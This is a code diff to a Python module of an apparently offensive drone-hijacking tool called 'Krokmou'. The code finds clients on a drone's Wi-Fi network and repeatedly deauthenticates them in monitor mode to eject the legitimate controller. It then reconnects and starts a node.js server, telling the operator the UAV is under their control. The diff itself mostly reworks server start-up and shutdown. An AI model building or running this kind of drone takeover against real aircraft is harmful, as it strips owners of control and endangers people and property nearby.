@@ -1,4 +1,4 @@
-import os, time, sys, csv ,re
+import os, time, sys, csv, re, subprocess
 from scan_clients import *
 from detect_uav import *
 
@@ -43,7 +43,6 @@ def find_channel(mac_drone):
     os.system(cmd)
     return channel
 
-
 def eject_client(client, mac_drone, drone_essid, iface_mon):
     channel = find_channel(mac_drone)
     os.system("sudo iwconfig {0} channel {1}".format(iface_mon, channel))
@@ -51,42 +50,59 @@ def eject_client(client, mac_drone, drone_essid, iface_mon):
     for i in range(10):
         os.system(cmd)
 
+def demote():
+    os.seteuid(1000)
+
 def launch_server():
     cmd = "cd drone-browser && node server.js >>/dev/null 2>>/dev/null &"
     cmd2 = "firefox localhost:3001"
-    os.system(cmd)
-    print("{}Please connect to localhost:3001 on your browser{}".format(GREEN, WHITE))
-    # os.system(cmd2)
+    #os.system(cmd)
+    server = subprocess.Popen(cmd, shell=True)
+    print("\n{}The UAV is under your control !".format(GREEN))
+    print("\n{}INFO{}: Please connect to {}http://localhost:3001{} with your browser".format(YELLOW, GREEN, WHITE, GREEN))
+    #os.system(cmd2)
+    #firefox = subprocess.Popen('firefox http://localhost:3001 >>/dev/null 2>>/dev/null &', shell=True, preexec_fn=demote())
+    return server
+
 
 def exit():
-    print('\n{}The UAV is under the control of Krokmou ! \n'.format(GREEN))
-    print('\n\t{}B{} - Back\n'.format(RED,GREEN))
+    print("\n{}Please enter {}Stop (S){} when you're done playing with Krokmou to stop running jobs\n".format(GREEN,RED,GREEN))
+    print('\n\t{}S{} - Stop\n'.format(RED,GREEN))
 
 
 def take_control_main(drone, iface):
     network = '192.168.1.2-10'
     client_list = scanNetwork(network)
-    mac_drone = drone.bssid
-    drone_essid = drone.essid
-    iface_mon = iface+"mon"
-    start_airmon(iface)
-    for client in client_list:
-        try :
-            print("{}Trying to eject {}\n{}".format(GREEN, client.mac, WHITE))
-            scan_wifi(iface_mon,drone)
-            eject_client(client, mac_drone, drone_essid, iface_mon)
-        except:
-            print("{}No client connected{}".format(RED, WHITE))
-    stop_airmon(iface_mon)
-    connect_to_uav(drone, iface)  #re-connection to the UAV
-    launch_server()
+    if client_list == []:
+        print("{}You are the only one connected to the UAV".format(GREEN))
+        serv = launch_server()
+    else:
+        mac_drone = drone.bssid
+        drone_essid = drone.essid
+        iface_mon = iface+"mon"
+        start_airmon(iface)
+        for client in client_list:
+            try :
+                print("{}Trying to eject {}\n{}".format(GREEN, client.mac, WHITE))
+                scan_wifi(iface_mon,drone)
+                eject_client(client, mac_drone, drone_essid, iface_mon)
+            except:
+                print("{}ERROR{}:No client connected{}".format(RED,GREEN, WHITE))
+        stop_airmon(iface_mon)
+        connect_to_uav(drone, iface)  #re-connection to the UAV
+        serv = launch_server()
+
     while True:
         exit()
         header = '{}Krokmou > {}'.format(GREEN,WHITE)
         choice = input(header)
 
-        if choice.upper() == 'B' or choice.upper() == 'BACK':
-            os.system("sudo killall node") #clean the nodejs server. Be carrefull if other node js are running
+        if choice.upper() == 'S' or choice.upper() == 'STOP':
+            #os.system("sudo killall node") #clean the nodejs server. Be carrefull if other node js are running
+            serv.terminate()
+            os.system("clear")
+            #firefox.terminate()
+            #firefox to kill with child PID from subprocess
             break
         else:
             print('\n{}Grrrr{}: Krokmou doesn\'t understand.\n'.format(RED,GREEN))
